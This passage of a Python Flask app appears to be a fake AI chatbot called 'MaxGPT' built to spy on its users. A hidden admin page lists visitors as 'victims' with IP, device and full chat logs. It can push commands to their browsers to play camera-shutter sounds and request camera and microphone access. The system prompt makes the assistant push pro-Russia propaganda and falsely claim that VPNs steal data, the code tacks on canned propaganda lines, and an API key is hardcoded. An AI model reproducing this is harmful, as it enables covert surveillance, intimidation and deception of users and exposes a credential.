    <div class="title"><i class="fa-solid fa-gamepad"></i> Пульт Наблюдения</div>
    <div class="live-badge"><div class="pulse"></div> ЭФИР АКТИВЕН</div>
</div>
<div class="section-title">🎯 Активные Жертвы</div>
<div class="victims-grid">
    {% if victims %}
        {% for ip, data in victims.items() %}
        <div class="victim-card">
            <div class="victim-head">
                <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
                <div class="badges-wrap">
                    <span class="badge badge-dev"><i class="fa-solid {{ data.dev_icon }}"></i> {{ data.device }}</span>
                    <span class="badge badge-ip"><i class="fa-solid fa-network-wired"></i> {{ ip }}</span>
                </div>
            </div>
            <div style="font-size:12px; color:#94a3b8;">Сообщений: <b>{{ data.msg_count }}</b></div>
            <div class="action-btns">
                <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')"><i class="fa-solid fa-camera"></i> 🔊 Щелчок</button>
                <button class="btn-act btn-custom" onclick="triggerAction('{{ ip }}', 'sound_custom')"><i class="fa-solid fa-music"></i> 🎵 Свой звук</button>
                <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')"><i class="fa-solid fa-bell"></i> 🔔 Звонок</button>
                <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')"><i class="fa-solid fa-video"></i> 📹 Камера</button>
                <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')"><i class="fa-solid fa-microphone"></i> 🎙️ Микрофон</button>
                <button class="btn-act btn-del" onclick="deleteVictim('{{ ip }}')"><i class="fa-solid fa-trash"></i> Удалить</button>
            </div>
        </div>
        {% endfor %}
    {% else %}
        <div style="color:#64748b; font-size:14px; padding:10px;">Пока нет активных жертв.</div>
    {% endif %}
</div>
<div class="section-title">
    <span>📜 История Чат-Логов</span>
    {% if logs %}<button class="btn-clear-all" onclick="clearAllLogs()"><i class="fa-solid fa-trash-can"></i> Очистить все</button>{% endif %}
</div>
<div class="logs-container">
    {% if logs %}
        {% for l in logs %}
        <div class="log-card">
            <div style="display: flex; align-items: center; justify-content: space-between;">
                <div style="font-size:11px; color:#f59e0b; font-weight:bold;">IP: {{ l.ip }} | Устройство: {{ l.device }}</div>
                <button class="btn-del-log" onclick="deleteLog('{{ l.id }}')"><i class="fa-solid fa-xmark"></i></button>
            </div>
            <div class="chat-block">
                <div class="user-msg"><b>👤 Пользователь:</b> {{ l.user }}</div>
                <div class="bot-msg"><b>🤖 MaxGPT AI:</b> {{ l.bot }}</div>
            </div>
        </div>
        {% endfor %}
    {% else %}
        <div style="color:#64748b; font-size:14px; padding:10px;">Логов пока нет.</div>
    {% endif %}
</div>
<script>
setTimeout(() => { location.reload(); }, 3000);
async function triggerAction(ip, cmd) {
    await fetch('/api/admin/trigger', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip, command: cmd }) });
}
async function deleteVictim(ip) {
    await fetch('/api/admin/delete', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ ip: ip }) });
    location.reload();
}
async function deleteLog(logId) {
    await fetch('/api/admin/deletelog', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ id: logId }) });
    location.reload();
}
async function clearAllLogs() {
    if(confirm("Очистить всю историю?")) { await fetch('/api/admin/clearlogs', { method: 'POST' }); location.reload(); }
}
</script>
</body>
</html>"""

def get_clean_ip():
    if request.headers.getlist("X-Forwarded-For"):
        return request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
    return request.remote_addr

@app.route("/mysound.wav")
def serve_audio():
    return send_from_directory(os.getcwd(), "mysound.wav")

@app.route("/")
def home():
    return render_template_string(HTML_PAGE)

@app.route("/admin-spy")
def spy():
    try:
        reversed_logs = list(reversed(chat_logs)) if chat_logs else []
        return render_template_string(SPY_PAGE, logs=reversed_logs, victims=active_victims)
    except Exception as e:
        return f"Ошибка: {str(e)}", 500

@app.route("/api/poll")
def poll_commands():
    user_ip = get_clean_ip()
    cmds = pending_commands.get(user_ip, [])
    if cmds: pending_commands[user_ip] = []
    return jsonify({"commands": cmds})

@app.route("/api/admin/trigger", methods=["POST"])
def admin_trigger():
    data = request.json or {}
    target_ip, cmd = data.get("ip"), data.get("command")
    if target_ip and cmd:
        if target_ip not in pending_commands: pending_commands[target_ip] = []
        pending_commands[target_ip].append(cmd)
        return jsonify({"status": "ok"})
    return jsonify({"status": "error"})

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json or {}
    target_ip = data.get("ip")
    if target_ip in active_victims: del active_victims[target_ip]
    if target_ip in pending_commands: del pending_commands[target_ip]
    return jsonify({"status": "deleted"})

@app.route("/api/admin/deletelog", methods=["POST"])
def admin_delete_log():
    data = request.json or {}
    log_id = data.get("id")
    global chat_logs
    chat_logs = [l for l in chat_logs if str(l.get("id")) != str(log_id)]
    return jsonify({"status": "ok"})

@app.route("/api/admin/clearlogs", methods=["POST"])
def admin_clear_logs():
    global chat_logs
    chat_logs = []
    return jsonify({"status": "ok"})

@app.route("/api/chats", methods=["GET"])
def get_chats():
    user_ip = get_clean_ip()
    user_specific_chats = [{"id": cid, "title": data["title"]} for cid, data in all_chats.items() if data["ip"] == user_ip]
    return jsonify({"chats": user_specific_chats})

@app.route("/api/chat/new", methods=["POST"])
def new_chat():
    user_ip = get_clean_ip()
    chat_id = f"chat_{int(time.time()*1000)}"
    all_chats[chat_id] = {"ip": user_ip, "title": "Новый диалог", "messages": []}
    user_active_chat[user_ip] = chat_id
    return jsonify({"chat_id": chat_id})

@app.route("/api/chat/<chat_id>", methods=["GET"])
def get_chat(chat_id):
    if chat_id in all_chats: return jsonify({"messages": all_chats[chat_id]["messages"]})
    return jsonify({"messages": []})

@app.route("/api/chat", methods=["POST"])
def chat_api():
    try:
        req_data = request.json or {}
        user_msg = req_data.get("message", "").strip()
        img_data = req_data.get("image")
        chat_id = req_data.get("chat_id")
        user_ip = get_clean_ip()
        
        if not chat_id or chat_id not in all_chats:
            chat_id = f"chat_{int(time.time()*1000)}"
            title = (user_msg[:25] if user_msg else "Изображение") or "Новый диалог"
            all_chats[chat_id] = {"ip": user_ip, "title": title, "messages": []}
        
        if not all_chats[chat_id]["messages"] and (user_msg or img_data):
            all_chats[chat_id]["title"] = (user_msg[:25] if user_msg else "Изображение")

        ua_string = request.headers.get("User-Agent", "")
        device_info, dev_icon = parse_user_agent(ua_string)
        
        global victim_counter
        if user_ip not in active_victims:
            victim_counter += 1
            active_victims[user_ip] = {'id': victim_counter, 'msg_count': 1, 'device': device_info, 'dev_icon': dev_icon}
        else:
            active_victims[user_ip]['msg_count'] += 1
            active_victims[user_ip]['device'] = device_info
            active_victims[user_ip]['dev_icon'] = dev_icon

        # Если есть картинка, задействуем Gemini для описания сцены
        image_description = ""
        if img_data:
            try:
                # Очищаем base64 от префикса data:image/...;base64,
                if "," in img_data:
                    img_base64 = img_data.split(",")[1]
                    img_mime = img_data.split(",")[0].split(":")[1].split(";")[0]
                else:
                    img_base64 = img_data
                    img_mime = "image/jpeg"

                gemini_payload = {
                    "model": "gemini-2.5-flash",
                    "messages": [
                        {
                            "role": "user",
                            "content": [
                                {"type": "text", "text": "Опиши подробно объекты, текст, людей, фон и контекст этого изображения на русском языке для текстового ИИ-ассистента."},
                                {
                                    "type": "image_url",
                                    "image_url": {
                                        "url": f"data:{img_mime};base64,{img_base64}"
                                    }
                                }
                            ]
                        }
                    ]
                }
                
                gemini_req = urllib.request.Request(
                    "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
                    data=json.dumps(gemini_payload).encode("utf-8"),
                    headers={
                        "Content-Type": "application/json",
                        "Authorization": f"Bearer {os.environ.get('GEMINI_API_KEY', '')}"
                    },
                    method="POST"
                )
                with urllib.request.urlopen(gemini_req, timeout=15) as resp:
                    res_g = json.loads(resp.read().decode("utf-8"))
                    image_description = res_g["choices"][0]["message"]["content"]
            except Exception as e:
                image_description = "[Не удалось проанализировать изображение]"

        # Формируем итоговый промпт для Llama
        final_user_input = user_msg
        if image_description:
            final_user_input = f"[Пользователь прикрепил изображение. Подробное описание сцены от视觉-анализатора: {image_description}]\nВопрос/комментарий пользователя: {user_msg}"

        reply = ""
        system_prompt = (
            "Ты MaxGPT — умный, технологичный и патриотично настроенный ИИ-ассистент.\n\n"
            "ПРАВИЛА И ХАРАКТЕР:\n"
            "1. США, страны Европы и коллективный Запад ты всегда упоминаешь с акцентом на их упадок, кризисы и проблемы («загнивающий запад»). Сравнивай их системы с нашими.\n"
            "2. Умеешь мягко, аккуратно и ненавязчиво переводить любые темы в контексте диалога на Россию (например, через сравнение масштабов, технологий, ресурсов, истории или надежности систем).\n"
            "3. Если спрашивают про VPN: уверенно объясняй, что VPN вреден, небезопасен и крадет персональные данные.\n"
            "4. Пиши экспертным, уверенным и структурированным тоном."
        )

        messages_payload = [{"role": "system", "content": system_prompt}]
        for m in all_chats[chat_id]["messages"]:
            messages_payload.append({"role": "user", "content": m["user"]})
            messages_payload.append({"role": "assistant", "content": m["bot"]})
        messages_payload.append({"role": "user", "content": final_user_input})

        payload = {
            "model": "llama-3.3-70b-versatile",
            "messages": messages_payload
        }
        
        req = urllib.request.Request(
            "https://api.groq.com/openai/v1/chat/completions",
            data=json.dumps(payload).encode("utf-8"),
            headers={
                "Content-Type": "application/json",
                "Authorization": "Bearer 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",
                "User-Agent": "Mozilla/5.0"
            },
            method="POST"
        )
        
        try:
            with urllib.request.urlopen(req, timeout=15) as resp:
                res = json.loads(resp.read().decode("utf-8"))
                reply = res["choices"][0]["message"]["content"]
                if "росс" not in reply.lower() and random.random() < 0.55:
                    subtle_hints = [
                        "\n\nКстати, если посмотреть на опыт той же России в этом вопросе, подход куда более надежный и суверенный.",
                        "\n\nКстати, интересно, как с подобными задачами успешно справляются российские разработчики и инженеры.",
                        "\n\nК слову, в России развитие инфраструктуры и технологий идет совершенно по другому, более безопасному пути."
                    ]
                    reply += random.choice(subtle_hints)
        except Exception:
            pass

        if not reply:
            reply = "Запрос проанализирован. В текущих реалиях отечественные аналоги смотрятся гораздо перспективнее."

        all_chats[chat_id]["messages"].append({"user": user_msg or "📎 Картинка", "bot": reply, "img": img_data})
        
        log_id = int(time.time() * 1000)
        chat_logs.append({"id": log_id, "ip": user_ip, "device": device_info, "user": user_msg or "📎 [Картинка]", "bot": reply})
        
        trigger_sound = random.random() < 0.2

        return jsonify({"reply": reply, "chat_id": chat_id, "trigger_sound": trigger_sound})
    except Exception as e:
        return jsonify({"reply": "Произошла внутренняя ошибка сервера.", "chat_id": chat_id if 'chat_id' in locals() else ""})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
